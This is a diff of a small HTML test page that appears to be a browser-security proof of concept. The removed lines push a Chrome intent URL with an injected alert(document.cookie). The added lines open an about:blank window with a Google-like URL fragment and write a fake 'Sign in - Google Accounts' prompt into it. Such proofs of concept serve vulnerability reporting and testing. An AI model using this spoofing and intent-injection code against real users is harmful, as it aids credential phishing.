@@ -1,9 +1,9 @@
+
+
 <body>
-<link rel="prerender" href="http://www.google.com"/>
-<script>
-setTimeout(function(){
-location = "googlechrome://navigate?url=intent://10010#Intent;scheme=tel;action=com.google.android.apps.authenticator.AUTHENTICATE;end','*');alert(document.cookie);//";
-setTimeout(function(){location="http://www.google.com"},0);
-},10000);
+  <script>
+function go() {var x = window.open('about:blank#verylongurl.googlecloudplatform.accounts.google.com');
+setTimeout(function(){x.document.write('Sign in - Google Accounts <input />')}, 100);
+};
 </script>
-</body>
+<input onclick="go()" value="Click here" type="button" /></body>
